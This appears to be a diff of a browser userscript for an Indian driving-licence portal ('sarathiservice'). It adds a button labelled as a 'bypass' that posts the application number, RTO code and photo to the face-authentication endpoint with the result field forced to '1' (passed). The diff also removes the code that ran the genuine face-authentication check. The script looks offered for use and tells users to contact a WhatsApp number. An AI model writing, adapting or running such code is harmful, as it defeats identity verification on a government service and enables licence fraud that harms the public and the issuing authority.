@@ -11,11 +11,13 @@
 
 (function () {
     'use strict';
+
     // Wait for DOM to load
     window.addEventListener('load', () => {
+
         // Custom button banana
         const btn = document.createElement('button');
-        btn.innerText = "🚀 faceAuthentication";
+        btn.innerText = "🚀 Connect to columbus server for bypass";
         btn.style.position = "fixed";
         btn.style.bottom = "20px";
         btn.style.right = "20px";
@@ -29,39 +31,34 @@
         btn.style.zIndex = "99999";
         btn.title = "Click to send face auth data automatically";
         document.body.appendChild(btn);
+
         // Button click hone pe main kaam
         btn.addEventListener("click", async () => {
             console.log("🔄 Send button clicked — starting FaceAuth request...");
+
             // Wait a bit if applimg not ready
             if (typeof window.applimg === 'undefined' || !window.applimg) {
                 alert("⚠️ Image data (applimg) not found yet. Please ensure the page has fully loaded.");
                 return;
             }
+
             const applno = document.getElementById('llappln')?.value || '';
             const rtocode = document.getElementById('rtocode')?.value || '';
             const capPho = window.applimg;
+
             if (!applno || !rtocode || !capPho) {
                 alert("❌ Missing one or more required fields contact whatsapp 8009343354");
                 console.log({ applno, rtocode, capPhoLen: capPho?.length });
                 return;
             }
+
             try {
-                (async function restoreOriginalFlow() {
-                   console.log("Restoring original face-aware flow");
-                    if (typeof faceAuthStatus === "function") {
-                        try {
-                            await faceAuthStatus();
-                            console.log("faceAuthStatus completed");
-                        } catch (e) {
-                           console.error("faceAuthStatus failed:", e);
-                        }
-                    }
-                })();
                 const data = new URLSearchParams();
                 data.append("applno", applno);
                 data.append("rtocode", rtocode);
                 data.append("faceres", "1");
                 data.append("CapPho", capPho);
+
                 const response = await fetch("/sarathiservice/saveFaceAuthData.do", {
                     method: "POST",
                     credentials: "same-origin",
@@ -75,11 +72,14 @@
                     },
                     body: data.toString()
                 });
+
                 const json = await response.json();
                 console.log("✅ Server Response:", json);
+
                 // Webpage pe response show karna
                 let old = document.getElementById("customResponseBox");
                 if (old) old.remove();
+
                 const pre = document.createElement("pre");
                 pre.id = "customResponseBox";
                 pre.style.position = "fixed";
@@ -94,7 +94,9 @@
                 pre.style.border = "2px solid #0f0";
                 pre.innerText = JSON.stringify(json, null, 2);
                 document.body.appendChild(pre);
+
                 alert("✅ FaceAuth request sent successfully!");
+
             } catch (err) {
                 console.error("❌ Error during Face Auth Request:", err);
                 alert("❌ Error sending request. Check console for details.");
